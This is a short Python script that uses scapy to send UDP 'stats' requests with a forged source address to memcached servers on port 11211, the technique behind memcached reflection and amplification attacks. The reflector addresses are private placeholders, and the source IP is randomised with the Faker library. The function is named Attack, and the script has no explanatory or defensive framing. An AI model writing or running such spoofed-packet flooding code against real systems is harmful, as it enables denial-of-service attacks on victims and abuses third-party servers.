from scapy.all import IP, UDP, send, Raw
from faker import Faker
import random

fake= Faker()
memcache_servers = ["10.0.0.1", "10.0.0.2"]
memcache_query = b"stats\r\n"

src_ip = fake.ipv4()
def Attack(requestPerServer):
    for server in memcache_servers:
        ip = IP(src=src_ip, dst=server)
        for i in range(requestPerServer):
            src_port = random.randint(1024, 65535)
            udp = UDP(sport=src_port, dport=11211)
            packet = ip/udp/Raw(load=memcache_query)
            send(packet, verbose=False)
            print(f"send {i+1} request")

